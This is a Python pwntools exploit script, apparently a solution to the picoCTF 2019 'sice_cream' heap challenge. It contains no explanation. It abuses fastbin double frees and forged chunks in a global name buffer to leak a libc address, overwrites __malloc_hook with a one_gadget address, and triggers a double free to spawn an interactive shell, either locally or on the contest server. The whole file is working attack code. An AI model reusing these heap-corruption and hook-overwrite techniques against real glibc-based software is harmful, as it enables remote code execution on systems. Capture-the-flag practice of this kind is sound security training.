from pwn import *

e = ELF("./sice_cream")
libc = ELF("./libc.so.6")

context.binary = e.path

if "--remote" in sys.argv:
  p = remote("2019shell1.picoctf.com", 29554)
else:
  p = process(e.path
  )
  #{"LD_PRELOAD": libc.path})

idx = 0
def alloc(size, pay="AAAA"):
  global idx

  p.sendline("1")
  p.sendlineafter(">", str(size))
  p.sendlineafter(">", pay)
  p.recvuntil(">")  

  ret = idx
  idx += 1
  return ret

def free(idx):
  p.sendline("2")
  p.sendlineafter(">", str(idx))
  p.recvuntil(">")  

def change(name):
  p.sendline("3")
  p.sendlineafter(">", name)
  
  p.recvuntil("a name like ")
  ret = p.recvuntil("!", drop=True)  

  p.recvuntil(">")

  return ret

p.recvuntil(">")
p.sendline("A" * 8 + p64(0x61) + p64(0))

p.recvuntil(">")

A = alloc(0x58)
B = alloc(0x58)

A2 = alloc(0x48)
B2 = alloc(0x48)

free(A)
free(B)
free(A)

alloc(0x58, p64(0x602040))
alloc(0x58)
alloc(0x58)
C = alloc(0x58)

change("A" * 8 + p64(0x91).ljust(0x90, "\x00") + p64(0x11) + p64(0) + p64(0x11))
free(C)
bin_ptr = u64(change("A" * 0xf)[0x10:].ljust(8, "\x00"))
leak = bin_ptr - 0x7fadb1047b78 + 0x00007fadb0c83000
print("{:#x}".format(leak))



free(A2)
free(B2)
free(A2)

alloc(0x48, p64(0x61))
alloc(0x48)
alloc(0x48)

free(A)
free(B)
free(A)

alloc(0x58, p64(leak + libc.symbols["__malloc_hook"] + 0x28))
alloc(0x58)
alloc(0x58)
alloc(0x58, "\x00" * 0x30 + p64(leak + libc.symbols["__malloc_hook"] - 0x10))

change("A" * 0x8 + p64(0x21) + p64(bin_ptr) * 2)

alloc(0x58, p64(leak + [0x45216, 0x4526a, 0xf02a4, 0xf1147][2]))

free(A)
p.sendline("2")
p.sendlineafter(">", str(A))

p.interactive()
